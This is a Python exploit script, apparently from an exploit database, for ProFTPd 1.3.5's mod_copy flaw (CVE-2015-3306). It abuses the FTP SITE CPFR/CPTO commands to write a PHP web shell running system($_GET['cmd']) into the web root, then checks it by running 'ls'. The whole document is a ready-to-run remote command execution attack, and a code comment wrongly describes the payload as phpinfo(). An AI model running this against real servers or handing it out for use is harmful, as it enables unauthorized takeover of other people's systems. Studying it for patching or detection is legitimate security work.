# Exploit Title: ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)
# Date: 25/05/2021
# Exploit Author: Shellbr3ak
# Version: 1.3.5
# Tested on: Ubuntu 16.04.6 LTS
# CVE : CVE-2015-3306

#!/usr/bin/env python3

import sys
import socket
import requests

port = 21

def exploit(client, target):
    client.connect((target,port)) # Connecting to the target server
    banner = client.recv(74)
    print("[!] " + banner.decode(),end="")
    client.send(b"site cpfr /proc/self/cmdline\r\n")
    print("[!] " + client.recv(1024).decode(),end="")
    client.send(b"site cpto /tmp/. <?php system($_GET['cmd']); ?>\r\n") # phpinfo() is just a PoC.
    print("[!] " + client.recv(1024).decode(),end="")
    client.send(b"site cpfr /tmp/. <?php system($_GET['cmd']); ?> \r\n")
    print("[!] " + client.recv(1024).decode(),end="")
    client.send(b"site cpto /var/www/html/exploit.php\r\n")
    print("[!] " + client.recv(1024).decode(),end="")
    client.close()
    print("[+] Exploit Completed")

def check(url):
    req = requests.get(url) # Requesting the written PoC php file via HTTP
    if req.status_code == 200:
        print('[+] File Written Successfully')
        print(f'[+] Go to: {url}')
    else:
        print('[!] Something Went Wrong')
        print('[!] Directory might not be writable')

def main():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    target = sys.argv[1]
    exploit(client, target)
    url = 'http://' + target + '/exploit.php?cmd=ls'
    check(url)

if __name__ == '__main__':
    main()
